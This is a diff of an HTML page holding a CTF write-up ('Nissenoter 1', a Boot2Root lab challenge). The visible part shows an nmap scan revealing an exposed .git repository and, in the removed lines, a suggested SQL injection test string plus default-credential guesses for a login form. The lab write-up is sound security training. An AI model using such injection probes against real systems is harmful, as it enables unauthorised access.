@@ -1,451 +1,252 @@
-<!DOCTYPE html>
-<html lang="en">
-<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
-<meta charset="UTF-8">
-<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta http-equiv="X-UA-Compatible" content="ie=edge">
-<meta name="robots" content="index, follow">
-<meta name="revisit-after" content="15 days">
-<link rel="author" href="/humans.txt">
-<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
-<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
-<link rel="manifest" href="/site.webmanifest">
-<meta name="msapplication-TileImage" content="/mstile-144x144.png">
-<link rel="shortcut icon" href="/favicon.ico"><meta name="author" content="Adamino">
-
-
-  <meta itemprop="name" content="Nissenoter 1">
-  <meta itemprop="description" content="Challenge Name: Nissenoter 1
+<!doctype html><html lang=en><head><meta charset=UTF-8><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="ie=edge"><meta name=robots content="index, follow"><meta name=revisit-after content="15 days"><link rel=author href=/humans.txt><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><meta name=msapplication-TileImage content="/mstile-144x144.png"><link rel="shortcut icon" href=/favicon.ico><meta name=author content="Adamino"><meta itemprop=name content="Nissenoter 1"><meta itemprop=description content="Challenge Name: Nissenoter 1
 Category: Boot2Root
 Challenge Description: Vi har opfanget nissernes hemmelige notedelingsnetværk. Vores bedste praktikant siger, at det er umuligt at infiltrere netværket.
 Opgaven er tilgængelig via Haaukins:
 https://ncctf.haaukins.dk/
 Approach Enumeration We are to infiltrate the gnomes secret note sharing network! As with the previous dynamic challenges on Haaukins, we start out with the following nmap scan.
-┌──(haaukins㉿kali)-[~] └─$ sudo nmap -sC -sV -O -p- 77.76.246.224 [sudo] password for haaukins: Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-21 05:05 EST Nmap scan report for 77.76.246.224 Host is up (0.00019s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.2p1 Debian 2&#43;deb12u1 (protocol 2.0) | ssh-hostkey: | 256 308e05b497e351bc0200005355850ca0 (ECDSA) |_ 256 7de127b32e30c096e70dc32f62703266 (ED25519) 80/tcp open http Apache httpd 2.4.57 ((Debian)) | http-robots.txt: 1 disallowed entry |_/static/ |_http-title: Log ind | http-git: | 77.76.246.224:80/.git/ | Git repository found! | .gitignore matched patterns &#39;bug&#39; | .git/config matched patterns &#39;user&#39; | Repository description: Unnamed repository; edit this file &#39;description&#39; to name the... | Last commit message: nu med mere shoutbox |_ Project type: node.js application (guessed from .gitignore) |_http-server-header: Apache/2.4.57 (Debian) MAC Address: 02:42:4D:4C:F6:E0 (Unknown) Device type: general purpose Running: Linux 4.X|5.X OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 OS details: Linux 4.15 - 5.6 Network Distance: 1 hop Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 11.88 seconds We find the note sharing server with two open ports and take note of port 22 (ssh) &amp; 80 (http, usually a web app) being open! This would ordinarily indicate that we need to exploit a webapp (often PHP-based) being hosted on an Apache server!">
-  <meta itemprop="datePublished" content="2023-12-15T13:33:38+01:00">
-  <meta itemprop="dateModified" content="2023-12-15T13:33:38+01:00">
-  <meta itemprop="wordCount" content="2044">
-  <meta itemprop="keywords" content="Boot2Root"><meta property="og:url" content="http://localhost:1313/nc3/boot2root/nissenoter-1/">
-  <meta property="og:site_name" content="Adamino CTF Writeups">
-  <meta property="og:title" content="Nissenoter 1">
-  <meta property="og:description" content="Challenge Name: Nissenoter 1
+┌──(haaukins㉿kali)-[~] └─$ sudo nmap -sC -sV -O -p- 77.76.246.224 [sudo] password for haaukins: Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-21 05:05 EST Nmap scan report for 77.76.246.224 Host is up (0.00019s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0) | ssh-hostkey: | 256 308e05b497e351bc0200005355850ca0 (ECDSA) |_ 256 7de127b32e30c096e70dc32f62703266 (ED25519) 80/tcp open http Apache httpd 2.4.57 ((Debian)) | http-robots.txt: 1 disallowed entry |_/static/ |_http-title: Log ind | http-git: | 77.76.246.224:80/.git/ | Git repository found! | .gitignore matched patterns 'bug' | .git/config matched patterns 'user' | Repository description: Unnamed repository; edit this file 'description' to name the... | Last commit message: nu med mere shoutbox |_ Project type: node.js application (guessed from .gitignore) |_http-server-header: Apache/2.4.57 (Debian) MAC Address: 02:42:4D:4C:F6:E0 (Unknown) Device type: general purpose Running: Linux 4.X|5.X OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 OS details: Linux 4.15 - 5.6 Network Distance: 1 hop Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 11.88 seconds We find the note sharing server with two open ports and take note of port 22 (ssh) & 80 (http, usually a web app) being open! This would ordinarily indicate that we need to exploit a webapp (often PHP-based) being hosted on an Apache server!"><meta itemprop=datePublished content="2023-12-15T13:33:38+01:00"><meta itemprop=dateModified content="2023-12-15T13:33:38+01:00"><meta itemprop=wordCount content="2044"><meta itemprop=keywords content="Boot2Root"><meta property="og:url" content="https://ctf.adamino.dk/nc3/boot2root/nissenoter-1/"><meta property="og:site_name" content="Adamino CTF Writeups"><meta property="og:title" content="Nissenoter 1"><meta property="og:description" content="Challenge Name: Nissenoter 1
 Category: Boot2Root
 Challenge Description: Vi har opfanget nissernes hemmelige notedelingsnetværk. Vores bedste praktikant siger, at det er umuligt at infiltrere netværket.
 Opgaven er tilgængelig via Haaukins:
 https://ncctf.haaukins.dk/
 Approach Enumeration We are to infiltrate the gnomes secret note sharing network! As with the previous dynamic challenges on Haaukins, we start out with the following nmap scan.
-┌──(haaukins㉿kali)-[~] └─$ sudo nmap -sC -sV -O -p- 77.76.246.224 [sudo] password for haaukins: Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-21 05:05 EST Nmap scan report for 77.76.246.224 Host is up (0.00019s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.2p1 Debian 2&#43;deb12u1 (protocol 2.0) | ssh-hostkey: | 256 308e05b497e351bc0200005355850ca0 (ECDSA) |_ 256 7de127b32e30c096e70dc32f62703266 (ED25519) 80/tcp open http Apache httpd 2.4.57 ((Debian)) | http-robots.txt: 1 disallowed entry |_/static/ |_http-title: Log ind | http-git: | 77.76.246.224:80/.git/ | Git repository found! | .gitignore matched patterns &#39;bug&#39; | .git/config matched patterns &#39;user&#39; | Repository description: Unnamed repository; edit this file &#39;description&#39; to name the... | Last commit message: nu med mere shoutbox |_ Project type: node.js application (guessed from .gitignore) |_http-server-header: Apache/2.4.57 (Debian) MAC Address: 02:42:4D:4C:F6:E0 (Unknown) Device type: general purpose Running: Linux 4.X|5.X OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 OS details: Linux 4.15 - 5.6 Network Distance: 1 hop Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 11.88 seconds We find the note sharing server with two open ports and take note of port 22 (ssh) &amp; 80 (http, usually a web app) being open! This would ordinarily indicate that we need to exploit a webapp (often PHP-based) being hosted on an Apache server!">
-  <meta property="og:locale" content="en">
-  <meta property="og:type" content="article">
-    <meta property="article:section" content="nc3">
-    <meta property="article:published_time" content="2023-12-15T13:33:38+01:00">
-    <meta property="article:modified_time" content="2023-12-15T13:33:38+01:00">
-
-  <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="Nissenoter 1">
-  <meta name="twitter:description" content="Challenge Name: Nissenoter 1
+┌──(haaukins㉿kali)-[~] └─$ sudo nmap -sC -sV -O -p- 77.76.246.224 [sudo] password for haaukins: Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-21 05:05 EST Nmap scan report for 77.76.246.224 Host is up (0.00019s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0) | ssh-hostkey: | 256 308e05b497e351bc0200005355850ca0 (ECDSA) |_ 256 7de127b32e30c096e70dc32f62703266 (ED25519) 80/tcp open http Apache httpd 2.4.57 ((Debian)) | http-robots.txt: 1 disallowed entry |_/static/ |_http-title: Log ind | http-git: | 77.76.246.224:80/.git/ | Git repository found! | .gitignore matched patterns 'bug' | .git/config matched patterns 'user' | Repository description: Unnamed repository; edit this file 'description' to name the... | Last commit message: nu med mere shoutbox |_ Project type: node.js application (guessed from .gitignore) |_http-server-header: Apache/2.4.57 (Debian) MAC Address: 02:42:4D:4C:F6:E0 (Unknown) Device type: general purpose Running: Linux 4.X|5.X OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 OS details: Linux 4.15 - 5.6 Network Distance: 1 hop Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 11.88 seconds We find the note sharing server with two open ports and take note of port 22 (ssh) & 80 (http, usually a web app) being open! This would ordinarily indicate that we need to exploit a webapp (often PHP-based) being hosted on an Apache server!"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="nc3"><meta property="article:published_time" content="2023-12-15T13:33:38+01:00"><meta property="article:modified_time" content="2023-12-15T13:33:38+01:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Nissenoter 1"><meta name=twitter:description content="Challenge Name: Nissenoter 1
 Category: Boot2Root
 Challenge Description: Vi har opfanget nissernes hemmelige notedelingsnetværk. Vores bedste praktikant siger, at det er umuligt at infiltrere netværket.
 Opgaven er tilgængelig via Haaukins:
 https://ncctf.haaukins.dk/
 Approach Enumeration We are to infiltrate the gnomes secret note sharing network! As with the previous dynamic challenges on Haaukins, we start out with the following nmap scan.
-┌──(haaukins㉿kali)-[~] └─$ sudo nmap -sC -sV -O -p- 77.76.246.224 [sudo] password for haaukins: Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-21 05:05 EST Nmap scan report for 77.76.246.224 Host is up (0.00019s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.2p1 Debian 2&#43;deb12u1 (protocol 2.0) | ssh-hostkey: | 256 308e05b497e351bc0200005355850ca0 (ECDSA) |_ 256 7de127b32e30c096e70dc32f62703266 (ED25519) 80/tcp open http Apache httpd 2.4.57 ((Debian)) | http-robots.txt: 1 disallowed entry |_/static/ |_http-title: Log ind | http-git: | 77.76.246.224:80/.git/ | Git repository found! | .gitignore matched patterns &#39;bug&#39; | .git/config matched patterns &#39;user&#39; | Repository description: Unnamed repository; edit this file &#39;description&#39; to name the... | Last commit message: nu med mere shoutbox |_ Project type: node.js application (guessed from .gitignore) |_http-server-header: Apache/2.4.57 (Debian) MAC Address: 02:42:4D:4C:F6:E0 (Unknown) Device type: general purpose Running: Linux 4.X|5.X OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 OS details: Linux 4.15 - 5.6 Network Distance: 1 hop Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 11.88 seconds We find the note sharing server with two open ports and take note of port 22 (ssh) &amp; 80 (http, usually a web app) being open! This would ordinarily indicate that we need to exploit a webapp (often PHP-based) being hosted on an Apache server!">
-<title>Nissenoter 1</title>
-<link rel="stylesheet dns-prefetch preconnect preload prefetch" as="style" href="http://localhost:1313/css/style.min.2d1df3d10e8fa64ec05ab1169da39cc7ce323ff1a80fb94a0b820888e0defd02.css" integrity="sha256-LR3z0Q6Ppk7AWrEWnaOcx84yP/GoD7lKC4IIiODe/QI=" crossorigin="anonymous">
-	</head>
-<body id="page">
-	<header id="site-header" class="animated slideInUp">
-		<div class="hdr-wrapper section-inner">
-			<div class="hdr-left">
-				<div class="site-branding">
-					<a href="http://localhost:1313/">Adamino CTF Writeups</a>
-				</div>
-				<nav class="site-nav hide-in-mobile">
-				<a href="http://localhost:1313/tools/">Tools</a>
-				<a href="http://localhost:1313/nc3/">NC3</a>
-</nav>
-			</div>
-			<div class="hdr-right hdr-icons">
-				<span class="hdr-social hide-in-mobile"><a href="https://github.com/onero" target="_blank" rel="noopener me" title="Github"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24"
-  fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-  <path
-    d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
-  </path>
-</svg></a></span><button id="menu-btn" class="hdr-btn" title="Menu"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
-  stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
-  class="feather feather-menu">
-  <line x1="3" y1="12" x2="21" y2="12"></line>
-  <line x1="3" y1="6" x2="21" y2="6"></line>
-  <line x1="3" y1="18" x2="21" y2="18"></line>
-</svg></button>
-			</div>
-		</div>
-	</header>
-	<div id="mobile-menu" class="animated fast">
-		<ul>
-			<li><a href="http://localhost:1313/tools/">Tools</a></li>
-			<li><a href="http://localhost:1313/nc3/">NC3</a></li>
-		</ul>
-	</div>
-
-
-	<main class="site-main section-inner thin animated fadeIn faster">
-		<h1>Nissenoter 1</h1>
-		<div class="content">
-			<h2 id="challenge-name">Challenge Name:<a href="#challenge-name" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
-<p>Nissenoter 1</p>
-<h2 id="category">Category:<a href="#category" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
-<p>Boot2Root</p>
-<h2 id="challenge-description">Challenge Description:<a href="#challenge-description" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
-<p>Vi har opfanget nissernes hemmelige notedelingsnetværk. Vores bedste praktikant siger, at det er <em>umuligt</em> at infiltrere netværket.</p>
-<p><em>Opgaven er tilgængelig via Haaukins:</em></p>
-<p><a href="https://ncctf.haaukins.dk/">https://ncctf.haaukins.dk/</a></p>
-<h2 id="approach">Approach<a href="#approach" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
-<h3 id="enumeration">Enumeration<a href="#enumeration" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
-<p>We are to infiltrate the gnomes secret note sharing network! As with the previous dynamic challenges on Haaukins, we start out with <a href="https://explainshell.com/explain?cmd=sudo&#43;nmap&#43;-sC&#43;-sV&#43;-O&#43;-p-">the following nmap scan</a>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>haaukins㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>└─$ sudo nmap -sC -sV -O -p- 77.76.246.224
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> haaukins:
-</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-12-21 05:05 EST
-</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 77.76.246.224
-</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.00019s latency<span style="color:#f92672">)</span>.
-</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65533</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
-</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>| ssh-hostkey:
-</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 308e05b497e351bc0200005355850ca0 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 7de127b32e30c096e70dc32f62703266 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.57 <span style="color:#f92672">((</span>Debian<span style="color:#f92672">))</span>
-</span></span><span style="display:flex;"><span>| http-robots.txt: <span style="color:#ae81ff">1</span> disallowed entry
-</span></span><span style="display:flex;"><span>|_/static/
-</span></span><span style="display:flex;"><span>|_http-title: Log ind
-</span></span><span style="display:flex;"><span>| http-git:
-</span></span><span style="display:flex;"><span>|   77.76.246.224:80/.git/
-</span></span><span style="display:flex;"><span>|     Git repository found!
-</span></span><span style="display:flex;"><span>|     .gitignore matched patterns <span style="color:#e6db74">&#39;bug&#39;</span>
-</span></span><span style="display:flex;"><span>|     .git/config matched patterns <span style="color:#e6db74">&#39;user&#39;</span>
-</span></span><span style="display:flex;"><span>|     Repository description: Unnamed repository; edit this file <span style="color:#e6db74">&#39;description&#39;</span> to name the...
-</span></span><span style="display:flex;"><span>|     Last commit message: nu med mere shoutbox
-</span></span><span style="display:flex;"><span>|_    Project type: node.js application <span style="color:#f92672">(</span>guessed from .gitignore<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.57 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>MAC Address: 02:42:4D:4C:F6:E0 <span style="color:#f92672">(</span>Unknown<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>Device type: general purpose
-</span></span><span style="display:flex;"><span>Running: Linux 4.X|5.X
-</span></span><span style="display:flex;"><span>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
-</span></span><span style="display:flex;"><span>OS details: Linux 4.15 - 5.6
-</span></span><span style="display:flex;"><span>Network Distance: <span style="color:#ae81ff">1</span> hop
-</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 11.88 seconds
-</span></span></code></pre></div><p>We find the note sharing server with two open ports and take note of port 22 (ssh) &amp; 80 (http, usually a web app) being open!
-This would ordinarily indicate that we need to exploit a webapp (often PHP-based) being hosted on an Apache server!</p>
-<p>We also find a robot.txt file, which is always a great idea to check for, when hacking webapps!
-Even more interestingly we also find a git repository on the server at &ldquo;/.git/&rdquo;!</p>
-<h3 id="exploitation">Exploitation<a href="#exploitation" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
-<p>With plenty of interesting leads to go by, we connect to the address and take a look ath the webapp</p>
-<p><img src="/nc3/boot2root/nissenoter-1/images/Webapp.png" alt="Nissenoter webapp"></p>
-<p>We are greeted by a login form and a &ldquo;shout box&rdquo; on the inital page.
-When facing a login form one should always try out &ldquo;default credentials&rdquo;, such as &ldquo;user/user&rdquo; &amp; &ldquo;admin/admin&rdquo; and also test for low hanging <a href="https://www.imperva.com/learn/application-security/sql-injection-sqli/#:~:text=SQL%20injection%2C%20also%20known%20as,lists%20or%20private%20customer%20details.">SQL injection</a>, which can be testet with something as simple as the following in the input fields.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; OR 1=1; --
-</span></span></span></code></pre></div><p>So of course we try our luck.</p>
-<p><img src="/nc3/boot2root/nissenoter-1/images/Invalid%20login%20credentials.png" alt="Invalid login"></p>
-<p>It does however not appear to be that easy.
+┌──(haaukins㉿kali)-[~] └─$ sudo nmap -sC -sV -O -p- 77.76.246.224 [sudo] password for haaukins: Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-21 05:05 EST Nmap scan report for 77.76.246.224 Host is up (0.00019s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0) | ssh-hostkey: | 256 308e05b497e351bc0200005355850ca0 (ECDSA) |_ 256 7de127b32e30c096e70dc32f62703266 (ED25519) 80/tcp open http Apache httpd 2.4.57 ((Debian)) | http-robots.txt: 1 disallowed entry |_/static/ |_http-title: Log ind | http-git: | 77.76.246.224:80/.git/ | Git repository found! | .gitignore matched patterns 'bug' | .git/config matched patterns 'user' | Repository description: Unnamed repository; edit this file 'description' to name the... | Last commit message: nu med mere shoutbox |_ Project type: node.js application (guessed from .gitignore) |_http-server-header: Apache/2.4.57 (Debian) MAC Address: 02:42:4D:4C:F6:E0 (Unknown) Device type: general purpose Running: Linux 4.X|5.X OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 OS details: Linux 4.15 - 5.6 Network Distance: 1 hop Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 11.88 seconds We find the note sharing server with two open ports and take note of port 22 (ssh) & 80 (http, usually a web app) being open! This would ordinarily indicate that we need to exploit a webapp (often PHP-based) being hosted on an Apache server!"><title>Nissenoter 1</title>
+<link rel="stylesheet dns-prefetch preconnect preload prefetch" as=style href=https://ctf.adamino.dk/css/style.min.2d1df3d10e8fa64ec05ab1169da39cc7ce323ff1a80fb94a0b820888e0defd02.css integrity="sha256-LR3z0Q6Ppk7AWrEWnaOcx84yP/GoD7lKC4IIiODe/QI=" crossorigin=anonymous></head><body id=page><header id=site-header class="animated slideInUp"><div class="hdr-wrapper section-inner"><div class=hdr-left><div class=site-branding><a href=https://ctf.adamino.dk/>Adamino CTF Writeups</a></div><nav class="site-nav hide-in-mobile"><a href=https://ctf.adamino.dk/tools/>Tools</a>
+<a href=https://ctf.adamino.dk/nc3/>NC3</a></nav></div><div class="hdr-right hdr-icons"><span class="hdr-social hide-in-mobile"><a href=https://github.com/onero target=_blank rel="noopener me" title=Github><svg class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg></a></span><button id=menu-btn class=hdr-btn title=Menu><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="18" x2="21" y2="18"/></svg></button></div></div></header><div id=mobile-menu class="animated fast"><ul><li><a href=https://ctf.adamino.dk/tools/>Tools</a></li><li><a href=https://ctf.adamino.dk/nc3/>NC3</a></li></ul></div><main class="site-main section-inner thin animated fadeIn faster"><h1>Nissenoter 1</h1><div class=content><h2 id=challenge-name>Challenge Name:<a href=#challenge-name class=anchor aria-hidden=true><svg viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h2><p>Nissenoter 1</p><h2 id=category>Category:<a href=#category class=anchor aria-hidden=true><svg viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h2><p>Boot2Root</p><h2 id=challenge-description>Challenge Description:<a href=#challenge-description class=anchor aria-hidden=true><svg viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h2><p>Vi har opfanget nissernes hemmelige notedelingsnetværk. Vores bedste praktikant siger, at det er <em>umuligt</em> at infiltrere netværket.</p><p><em>Opgaven er tilgængelig via Haaukins:</em></p><p><a href=https://ncctf.haaukins.dk/>https://ncctf.haaukins.dk/</a></p><h2 id=approach>Approach<a href=#approach class=anchor aria-hidden=true><svg viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h2><h3 id=enumeration>Enumeration<a href=#enumeration class=anchor aria-hidden=true><svg viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h3><p>We are to infiltrate the gnomes secret note sharing network! As with the previous dynamic challenges on Haaukins, we start out with <a href="https://explainshell.com/explain?cmd=sudo+nmap+-sC+-sV+-O+-p-">the following nmap scan</a>.</p><div class=highlight><pre tabindex=0 